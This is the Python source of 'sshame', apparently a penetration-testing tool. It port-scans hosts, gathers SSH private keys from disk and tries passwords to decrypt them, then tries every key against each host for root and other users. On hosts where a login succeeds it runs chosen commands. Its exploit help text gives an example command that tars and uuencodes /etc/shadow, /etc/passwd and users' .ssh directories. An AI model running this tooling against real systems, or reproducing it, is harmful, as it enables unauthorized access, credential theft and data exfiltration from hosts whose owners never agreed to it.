#!/usr/bin/env python3
import argparse
from scapy.all import sr, IP, TCP, conf as scapy_conf, L3RawSocket
import io
import sys
import cmd2
import os
import logging
import yaml
import threading
import time
import sqlite3
import ipaddress
import struct
import socket
from glob import glob
import hashlib
import base64
import asyncio
import asyncssh
from tabulate import tabulate
from sqlalchemy.orm import sessionmaker, scoped_session, Query
from sqlalchemy.sql import func, select, case
from sqlalchemy import create_engine
from sshame.db import Host, Base, Key, Credential, Command, CommandiAlias

version = "0.5"

try:
    from colorama import Back
    BACK_RESET = Back.RESET
    BACK_GREEN = Back.LIGHTGREEN_EX
    BACK_BLUE = Back.LIGHTBLUE_EX
except ImportError:
    try:
        from colored import bg
        BACK_RESET = bg(0)
        BACK_BLUE = bg(27)
        BACK_GREEN = bg(119)
    except ImportError:
        BACK_RESET = ''
        BACK_BLUE = ''
        BACK_GREEN = ''

# https://www.pythoncentral.io/sqlalchemy-orm-examples/
#db = sqlite3.connect('session.db')

logging.getLogger().setLevel(logging.DEBUG)
asyncssh.set_log_level(logging.DEBUG)
log = logging.getLogger('sshame')
asyncssh.set_debug_level(2)


def configure_logging():
    global log
    # logging.getLogger("asyncssh").setLevel(logging.DEBUG)
    # logging.getLogger("asyncio").setLevel(logging.DEBUG)
    log.setLevel(logging.DEBUG)
    # create file handler which logs even debug messages
    fh = logging.FileHandler('sshame.log')
    fh.setLevel(logging.DEBUG)
    # create console handler with a higher log level
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    # create formatter and add it to the handlers
    formatter = logging.Formatter(
        "%(asctime)s %(process)d %(name)s [%(levelname).1s] %(message)r"
    )
    fh.setFormatter(formatter)
    formatter = logging.Formatter(
        "%(asctime)s %(name)s [%(levelname).1s] %(message)r"
    )
    ch.setFormatter(formatter)
    # add the handlers to the log
    log.addHandler(fh)
    log.addHandler(ch)


def file_len(fname):
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1


def progbar(curr, total, full_progbar=20):
    frac = curr/total
    filled_progbar = round(frac*full_progbar)
    print('Completed: [' + '#'*filled_progbar + ' '*(full_progbar-filled_progbar) + ']', '[{:>7.2%}]'.format(frac), end='\r')
    sys.stdout.flush()


class Shell(cmd2.Cmd):
    intro = f'Welcome to the sshame {version}\nType help or ? to list commands.\n'
    prompt = '(sshame) '
    file = None
    db = None
    session_name = None
    CMD_CAT_SSHAME = 'Sshame'
    timeout = 60.0

    def __init__(self):
        log.info(f"Starting shame {version}")
        histfile = os.path.expanduser('~/.sshame_history')
        super().__init__(persistent_history_file=histfile)
        self.settable.update({'timeout': 'Network timeout in seconds'})
        self.init_db()
        log.info(f"Network timeout: {self.timeout}s")

    hosts_parser = cmd2.Cmd2ArgumentParser()
    hosts_parser.add_argument(
        '-v', '--verbose', action='store_true', help='Show session info')
    hosts_item_group = hosts_parser.add_mutually_exclusive_group()
    hosts_item_group.add_argument(
        '-a', '--add', type=str, nargs='+', help='Add hosts')
    hosts_item_group.add_argument(
        '-f', '--file', type=str, nargs=1, help='Add hosts from file')
    hosts_item_group.add_argument(
        '-l', '--list', action='store_true', help='List hosts')
    hosts_item_group.add_argument(
        '-d', '--disable', type=str, nargs='+', help='Disable hosts')
    hosts_item_group.add_argument(
        '-e', '--enable', type=str, nargs='+', help='Enable hosts')
    hosts_parser.add_argument('-p', '--port', type=int, nargs='*',
                              default=[22], help='TCP port numbers to be used')

    @cmd2.with_argparser(hosts_parser)
    @cmd2.with_category(CMD_CAT_SSHAME)
    def do_hosts(self, arg):
        'Maintain the targets (host, port)'

        def add_hosts(hosts, ports=None):
            ports = [22] if not ports else ports
            self.poutput(
                f"Scanning {','.join(hosts)} on port(s) {','.join([str(p) for p in ports])}")
            # https://scapy.readthedocs.io/en/latest/troubleshooting.html#i-can-t-ping-127-0-0-1-scapy-does-not-work-with-127-0-0-1-or-on-the-loopback-interface
            scapy_conf.L3socket = L3RawSocket
            res, unans = sr(IP(dst=hosts)  # ["10.203.216.142", "10.222.5.20", "10.222.143.52"])
                            / TCP(flags="S", dport=ports), retry=1, timeout=10)

            for s, r in res:
                if r.haslayer(TCP) and (r.getlayer(TCP).flags & 2):
                    # if s[TCP].dport == r[TCP].sport:
                    #   print("%d is unfiltered" % s[TCP].dport)
                    h = s[IP].dst
                    p = s[TCP].dport
                    host = self.db.query(Host).filter(
                        Host.address == h).filter(Host.port == p).first()
                    if not host:
                        host = Host(address=s[IP].dst, port=s[TCP].dport)
                        log.info(f"Adding host (port open): {s[IP].dst} {s[TCP].dport}")
                    else:
                        host.updated = func.now()
                    host.enabled = True
                    self.db.add(host)
            self.db.commit()

        if arg.add:
            add_hosts(arg.add, arg.port)
        if arg.file:
            hosts = set()
            fl = file_len(arg.file[0])
            i = 0
            log.info("Resolving hosts to IP addresses...")
            with open(arg.file[0], 'rt') as f:
                for l in f:
                    try:
                        ls = l.strip()
                        ip = socket.gethostbyname(ls)
                        # log.info(f"{ls} > {ip}")
                        hosts.add(ip)
                    except Exception as ex:
                        # log.info(f"{ls} > ")
                        # log.error(ex)
                        pass
                    i += 1
                    progbar(i, fl)
            add_hosts(list(hosts), arg.port)
        if arg.list:
            q = self.db.query(Host.address, Host.port,
                              Host.enabled, Host.dn, Host.created)
            self.print_table(q)
        if arg.disable:
            ips = [ipaddress.ip_network(x, False) for x in arg.disable]
            hosts = self.db.query(Host)
            for h in hosts:
                a = ipaddress.ip_address(h.address)
                for n in ips:
                    if (a in n):
                        h.enabled = False
                        continue
            self.db.commit()
        if arg.enable:
            ips = [ipaddress.ip_network(x, False) for x in arg.enable]
            hosts = self.db.query(Host)
            for h in hosts:
                a = ipaddress.ip_address(h.address)
                for n in ips:
                    if (a in n):
                        h.enabled = True
                        continue
            self.db.commit()

    complete_hosts = cmd2.Cmd.path_complete

    keys_parser = cmd2.Cmd2ArgumentParser()
    keys_item_group = keys_parser.add_mutually_exclusive_group()
    keys_item_group.add_argument(
        '-a', '--add', type=str, nargs='+', help='Add keys')
    keys_item_group.add_argument(
        '-l', '--list', action='store_true', help='List keys')
    keys_item_group.add_argument(
        '-d', '--disable', type=str, nargs='+', help='Disable keys')
    keys_parser.add_argument('-p', '--passwd', type=str, nargs='*',
                             help='List of password to use for encrypted private keys')

    @cmd2.with_argparser(keys_parser)
    @cmd2.with_category(CMD_CAT_SSHAME)
    def do_keys(self, arg):
        'Maintain the private keys'
        def load_private_key(f, pwd):
            try:
                k = asyncssh.read_private_key(f, pwd)
                if k and pwd:
                    log.debug(f"Decrypted with {pwd} - {f}")
                return k
            except Exception as ex:
                log.debug(f"{str(ex)} - {f}")
                return None

        if arg.add:
            keys = {}
            dup = 0
            i = 0
            log.info(f"Adding ssh keys from: {arg.add}")
            files = []
            pwds = [None]
            if arg.passwd:
                pwds += arg.passwd
            for f in arg.add:
                new_files = glob(os.path.expandvars(
                    os.path.expanduser(f)), recursive=True)
                log.info(f"Discovered {len(new_files)} files in '{f}'.")
                files += new_files
            log.info(f"Going to examine {len(files)} files.")
            for f in files:
                i += 1
                progbar(i, len(files))
                if not os.path.isfile(f):
                    continue
                for pwd in pwds:
                    k = load_private_key(f, pwd)
                    if k:
                        break
                else:
                    continue
                t = k.get_algorithm()
                fp_sha256 = k.get_fingerprint()
                key = self.db.query(Key).filter(
                    Key.fingerprint == fp_sha256).first()
                if not key:
                    log.info(f"Importing {t} key: {f}")
                    keys[fp_sha256] = k
                    #f.seek(io.SEEK_SET, 0)
                    key = Key(source=f, key_type=t,
                              private_key=k.export_private_key(), fingerprint=fp_sha256)
                    self.db.add(key)
                    self.db.commit()
                else:
                    log.debug(f"Ignoring duplicate: {f}")
                    dup += 1
            self.poutput(f"Loaded {len(keys)} unique keys, ignoring {dup} duplicates")

        if arg.list:
            q = self.db.query(Key.fingerprint, Key.source,
                              Key.key_type, Key.created, func.sum(
                                  case([(Credential.valid == True, 1)], else_=0)).label('servers')
                              ).outerjoin(Credential, Key.fingerprint == Credential.key_fingerprint).group_by(Key.fingerprint).order_by(Key.created)
            self.print_table(q)

    complete_keys = cmd2.Cmd.path_complete

    creds_parser = cmd2.Cmd2ArgumentParser()
    creds_parser.add_argument(
        '-v', '--verbose', action='store_true', help='Show session info')
    creds_item_group = creds_parser.add_mutually_exclusive_group()
    # creds_item_group.add_argument(
    #    '-a', '--add', type=str, nargs='+', help='Add creds')
    creds_item_group.add_argument(
        '-l', '--list', action='store_true', help='List creds')
    # creds_item_group.add_argument(
    #    '-r', '--remove', type=str, nargs='+', help='Remove creds')

    @cmd2.with_argparser(creds_parser)
    @cmd2.with_category(CMD_CAT_SSHAME)
    def do_creds(self, arg):
        'Display credentials'
        if arg.list:
            q = self.db.query(Credential.username, Credential.valid, Credential.host_address, Credential.host_port, Credential.key_fingerprint,
                              Key.source, Credential.updated, Host.dn).join('host').join('key').order_by(Credential.host_address)
            if not arg.verbose:
                q = q.filter(Credential.valid == True)
            else:
                q = q.filter(Credential.valid != None)
            s = ""
            lc = hc = 0
            prev_host = None
            for r in q.all():
                lc += 1
                host = f"{r[2]}:{r[3]}"
                if prev_host != host:
                    prev_host = host
                    hc += 1
                    kc = 0
                    prev_key_fingerprint = None
                if prev_key_fingerprint != r[4]:
                    prev_key_fingerprint = r[4]
                    kc += 1
                _inv = {
                    True: "",
                    False: "Tested, not working: ",
                    None: "Not tested yet: "
                }
                hostname = r[7] if r[7] else r[2]
                invalid = _inv.get(r[1], lambda: f"Invalid status: {r[1]} ")
                port = f":{r[3]}" if r[3] != 22 else ""
                s += f"[{lc}/{hc}/{kc}]: {invalid}ssh -i {r[5]} {r[0]}@{hostname}{port}\n"
            self.ppaged(s)

    class MyQuery(Query):
        def count_star(self):
            count_query = (self.statement.with_only_columns([func.count()])
                           .order_by(None))
            return self.session.execute(count_query).scalar()

    def init_db(self, name='default'):
        if self.session_name == name:
            return
        if self.db:
            self.db.expire_all()
            self.db.rollback()

        db_name = f'sqlite:///{name}.db'
        log.info("Openning session: " + db_name)
        engine = create_engine(db_name)

        Base.metadata.create_all(engine)
        session_factory = sessionmaker(bind=engine, query_cls=self.MyQuery)
        self.db = scoped_session(session_factory)
        self.session_name = name
        if True:
            sqls = ["ALTER TABLE commands ADD COLUMN guid VARCHAR;",
                    "ALTER TABLE hosts ADD COLUMN enabled BOOLEAN;",
                    "ALTER TABLE keys ADD COLUMN enabled BOOLEAN;",
                    ]
            for s in sqls:
                try:
                    log.debug(f"Running {s}")
                    self.db.execute(s)
                    self.db.commit()
                except Exception as ex:
                    log.debug(f"Failed: {ex}")
                    pass


    session_parser = cmd2.Cmd2ArgumentParser()
    session_parser.add_argument(
        '-v', '--verbose', action='store_true', help='Show session info')
    session_parser.add_argument(
        'session', type=str, nargs="?", help='Session name')

    @cmd2.with_argparser(session_parser)
    @cmd2.with_category(CMD_CAT_SSHAME)
    def do_session(self, arg):
        'Set session name'
        if arg.session:
            self.init_db(arg.session)
        else:
            self.poutput(f"Current session: {self.session_name}")
        if arg.verbose:
            h = self.db.query(Host).count_star()
            ho = self.db.query(Credential.host_address, Credential.host_port).distinct(
            ).filter(Credential.valid == True).count()
            self.poutput(f"Hosts       : {h}")
            self.poutput(f"Keys        : {self.db.query(Key).count_star()}")
            self.poutput(f"Creds tested: {self.db.query(Credential).filter(Credential.valid != None).count_star()}")
            self.poutput(f"Creds valid : {self.db.query(Credential).filter(Credential.valid == True).count_star()}")
            self.poutput(f"Hosts open  : {ho} ({ho*100//h}%)")

    @cmd2.with_category(CMD_CAT_SSHAME)
    def do_resolve(self, argv):
        'Reverse DNS lookup for hosts'
        targets_cnt = self.db.query(Host).filter(Host.dn == None).count_star()
        targets = self.db.query(Host).filter(Host.dn == None)
        i = 0
        for h in targets:
            i += 1
            try:
                r = socket.gethostbyaddr(h.address)
                h.dn = str(r[0])
                self.db.add(h)
            except:
                pass
            progbar(i, targets_cnt)
        self.db.commit()

    def print_table(self, query):
        k = query.first()
        if not k:
            self.poutput("No entries found")
            return
        cols = k.keys()
        rows = query.all()
        msg = f"Entries: {len(rows)}{os.linesep * 2}"
        self.ppaged(msg + tabulate(rows, cols, tablefmt='orgtbl'))

    class PublicKeySSHClient(asyncssh.SSHClient):

        def __init__(self, db, keys, host_address, host_port, username):
            self.log_id = f"{username}@{host_address}:{host_port}"
            self._keylist = keys
            self.consumed = 0
            self.keys_to_test = len(keys)
            self.key_fingerprint = None
            self.db = db
            self.host_address = host_address
            self.host_port = host_port
            self.username = username

        def keys_consumed(self):
            return self.keys_to_test - len(self._keylist)

        def connection_made(self, conn):
            self.host = conn.get_extra_info('peername')[0]
            log.debug(f'[+] [{self.log_id}] Connection made.')

        def connection_lost(self, exc):
            log.debug(f'[-] [{self.log_id}] connection_lost: {str(exc)}')
            pass

        def auth_banner_received(self, msg, lang):
            log.debug(f'[*] [{self.log_id}] auth_banner: {msg}, {lang}')
            pass

        def auth_completed(self):
            log.debug(f'[+] [{self.log_id}] Authentication successful with {self.key_fingerprint} for {self.username}.')
            if not self.key_fingerprint:
                raise Exception("Authenticated with no key")
            cred = self.db.query(Credential).filter(Credential.host_address == self.host_address).filter(Credential.host_port == self.host_port).filter(
                Credential.key_fingerprint == self.key_fingerprint).filter(Credential.username == self.username).first()
            if not cred:
                cred = Credential(host_address=self.host_address, host_port=self.host_port,
                                  key_fingerprint=self.key_fingerprint, username=self.username)
            cred.valid = True
            log.debug(f'[*] [{self.log_id}] key1 {self.key_fingerprint} {cred.valid} for {self.username}@{self.host_address}')
            cred.updated = func.now()
            self.db.add(cred)
            self.db.commit()
            self.key_fingerprint = None

        def public_key_auth_requested(self):
            if self.key_fingerprint:
                cred = self.db.query(Credential).filter(Credential.host_address == self.host_address).filter(Credential.host_port == self.host_port).filter(
                    Credential.key_fingerprint == self.key_fingerprint).filter(Credential.username == self.username).first()
                log.debug(str(cred))
                if not cred:
                    cred = Credential(host_address=self.host_address, host_port=self.host_port,
                                      key_fingerprint=self.key_fingerprint, username=self.username)
                cred.valid = False
                log.debug(f'[{self.log_id}] [D] key2 {self.key_fingerprint} {cred.valid} for {self.username}@{self.host_address}')
                cred.updated = func.now()
                self.db.add(cred)
                self.db.commit()

            self.key_fingerprint, ret = self._keylist.popitem() if self._keylist else (None, None)
            log.debug(f'[{self.log_id}] [D] key3 {self.key_fingerprint} for {self.username}@{self.host_address}')
            return ret

    async def exploit_single_target(self, host_address, host_port, username='root', keys=None, cmds=None):
        log_id = f"{username}@{host_address}:{host_port}"
        async with self.sem:
            _pkssh = self.PublicKeySSHClient(
                self.db, keys, host_address, host_port, username)

            def client_factory():
                return _pkssh

            cmd_exec = False
            valid_creds = 0
            keys_consumed = 0
            log.debug(f'[*] [{log_id}] Remaining keys: {len(keys)}')
            while True:
                conn = None
                try:
                    log.debug(f'[*] [{log_id}] Connecting')
                    conn, client = await asyncio.wait_for(asyncssh.create_connection(client_factory, host_address, port=host_port, username=username, known_hosts=None,
                                                                                     client_keys=None, x509_trusted_certs=None, client_host_keys=None), timeout=self.timeout)
                    log.debug(f'[*] [{log_id}] Connection created')
                    valid_creds += 1
                    if not cmds:
                        continue
                    #cmd = 'ls .ssh/'
                    cmd_exec = True
                    async with conn:
                        for cmd in cmds:
                            log.debug(f'[{log_id}] executing cmd: {cmd}')
                            cmd_alias = self.db.query(CommandiAlias.cmd).filter(
                                CommandiAlias.alias == cmd).scalar()
                            c = self.db.query(Command).filter(Command.host_address == host_address).filter(Command.host_port == host_port).filter(
                                Command.cmd == cmd).filter(Command.username == username).first()
                            if not c:
                                c = Command(
                                    host_address=host_address, host_port=host_port, cmd=cmd, username=username)
                            try:
                                res = await conn.run(cmd_alias if cmd_alias else cmd, check=False)
                                # log.debug('done')
                                so = res.stdout
                                se = res.stderr
                                es = res.exit_status
                                c.exit_status = es
                                # log.debug(f'[{host_address}:{host_port}] exit: {es}')
                                if es != 0:
                                    c.stderr = se
                                    log.info(f'[{log_id}] [{es}] "{se}"')
                                else:
                                    c.stdout = so
                                    log.debug(f'[{log_id}] [{es}] "{so}"')
                            except Exception as ex:
                                msg = str(ex)
                                log.warning(f'[{log_id}] "{cmd}" {msg}')
                                c.exception = msg
                            self.db.add(c)
                        self.db.commit()
                        return -2
                except asyncio.TimeoutError:
                    log.warning(f'[{log_id}] Time out')
                    return valid_creds
                except Exception as ex:
                    msg = str(ex)
                    ignore = ['Permission denied', 'Too many authentication', 'Connection reset by peer',
                              'The maximum number of authentication attempts']
                    if (_pkssh.keys_consumed() == keys_consumed):
                        log.info(f'[{log_id}] No keys consumed, but: {msg}')
                        return valid_creds
                    keys_consumed = _pkssh.keys_consumed()
                    if not any(x in msg for x in ignore):
                        log.warning(f'[{log_id}] {msg}')
                        return valid_creds
                    if not _pkssh.key_fingerprint or cmd_exec:
                        log.debug(f'[{log_id}] No more keys')
                        return valid_creds  # Exception("No more keys")
                finally:
                    if conn:
                        conn.abort()

    async def schedule_exploit_jobs(self, usernames, cmds=None):

        keys = {x.fingerprint: x.private_key for x in self.db.query(Key)}

        self.sem = asyncio.Semaphore(20)
        jobs = []
        log.info(f"Preparing target jobs...")
        hosts_cnt = self.db.query(Host.address, Host.port).count()
        i = 0
        if cmds:
            kq = self.db.query(Credential.username, Host.address, Host.port, Key.fingerprint, Key.private_key
                    ).join('host').join('key').filter(Credential.valid == True).order_by(Credential.host_address)
            for x in kq:
                jobs.append(self.exploit_single_target(username=x[0], host_address=x[1], host_port=x[2],
                    keys={x[3]: x[4]}, cmds=cmds))
        else:
            for (host_address, host_port) in self.db.query(Host.address, Host.port).filter(Host.enabled == True):
                for username in usernames:
                    kq = self.db.query(Key.fingerprint, Key.private_key).filter(~Key.fingerprint.in_(
                        self.db.query(Credential.key_fingerprint).filter(
                            Credential.host_address == host_address).filter(Credential.host_port == host_port)
                        .filter(Credential.username == username).filter(Credential.valid.in_([True, False]))))

                    keys = {x[0]: x[1] for x in kq}
                    if not keys:
                        continue
                    jobs.append(self.exploit_single_target(host_address, host_port,
                                                 username, dict(keys), cmds))
                i += 1
                progbar(i, hosts_cnt)
        if not jobs:
            log.info("Nothing to do")
            return
        if cmds:
            msg = "Executing commands"
        else:
            msg = "Matching keys"
        log.info(f"{msg} - {len(jobs)} jobs scheduled")
        i = 0
        for f in asyncio.as_completed(jobs):
            result = await f
            if isinstance(result, Exception):
                log.warn('Task %d failed: %s' % (i, str(result)))
            # elif isinstance(result, int):
            #    if result >= 0:
            #        log.info('Task %d exited with status %d' %
            #                 (i, result))
            # elif result.exit_status != 0:
            #    log.error('Task %d command failed with status %s' %
            #              (i, result.exit_status))
            #    log.error(result.stderr)
            # else:
            #    log.info(f'Task {i} succeeded: {result.stdout}')
            log.debug(f"Remaining tasks: {len(jobs) - i} of {len(jobs)}")
            i += 1
            progbar(i, len(jobs))

        print()
        log.info(75*'-')

    exploit_parser = cmd2.Cmd2ArgumentParser()
    exploit_parser.add_argument(
        '-u', '--user', type=str, nargs='*', default=['root'],
        help='Use alternate username (default is root)')
    exploit_parser.add_argument(
        '-c', '--command', type=str, nargs='*',
        help='Execute given commands on target')

    @cmd2.with_argparser(exploit_parser)
    @cmd2.with_category(CMD_CAT_SSHAME)
    def do_exploit(self, arg):
        '''Brute force targets using available keys
E.g. exploit -c "tar -cf - .ssh /etc/passwd /etc/ldap.conf /etc/shadow /home/*/.ssh /etc/fstab | gzip | uuencode file.tar.gz"'''
        asyncio.get_event_loop().run_until_complete(
            self.schedule_exploit_jobs(arg.user, arg.command))

    commands_parser = cmd2.Cmd2ArgumentParser()
    commands_item_group = commands_parser.add_mutually_exclusive_group()
    commands_item_group.add_argument(
        '-a', '--add', type=str, nargs=2, help='Add command alias')
    commands_item_group.add_argument(
        '-l', '--list', action='store_true', help='List command alias')
    commands_item_group.add_argument(
        '-r', '--results', action='store_true', help='Show results')
    commands_item_group.add_argument(
        '-s', '--save', type=str, nargs=1, help='Save command output to file')

    @cmd2.with_argparser(commands_parser)
    @cmd2.with_category(CMD_CAT_SSHAME)
    def do_commands(self, arg):
        'Maintain commands and aliases'
        if arg.add:
            a = arg.add[0]
            c = arg.add[1]
            ca = self.db.query(CommandiAlias).filter(
                CommandiAlias.alias == a).first()
            if not ca:
                ca = CommandiAlias(alias=a)
            ca.cmd = c
            self.db.add(ca)
            self.db.commit()
        if arg.list:
            q = self.db.query(CommandiAlias.alias, CommandiAlias.cmd).filter(
                CommandiAlias.enabled)
            self.print_table(q)
        if arg.results:
            q = self.db.query(Command.guid, Command.host_address, Command.host_port, Command.username, Command.cmd,
                              Command.exit_status, func.coalesce(Command.stdout, Command.stderr, Command.exception).label('output'),
                              Command.updated)
            self.print_table(q)
        if arg.save:
            r = self.db.query(func.coalesce(Command.stdout, Command.stderr, Command.exception).label(
                'output')).filter(Command.guid == arg.save[0]).scalar()
            with open(arg.save[0], 'wt') as f:
                f.write(r)
                f.close()

    # ----- record and playback -----
    def do_record(self, arg):
        'Save future commands to filename:  RECORD rose.cmd'
        self.file = open(arg, 'w')

    def do_playback(self, arg):
        'Playback commands from a file:  PLAYBACK rose.cmd'
        self.close()
        with open(arg) as f:
            self.cmdqueue.extend(f.read().splitlines())

    def precmd(self, line):
        self.db.rollback()
        #line = line.lower()
        # if self.file and 'playback' not in line:
        #    print(line, file=self.file)
        return line

    def close(self):
        if self.file:
            self.file.close()
            self.file = None


def chunks(l, n):
    """Yield successive n-sized chunks from l."""
    for i in range(0, len(l), n):
        yield l[i:i + n]


def main():
    configure_logging()

    shell = Shell()
    shell.cmdloop()


if __name__ == '__main__':
    main()
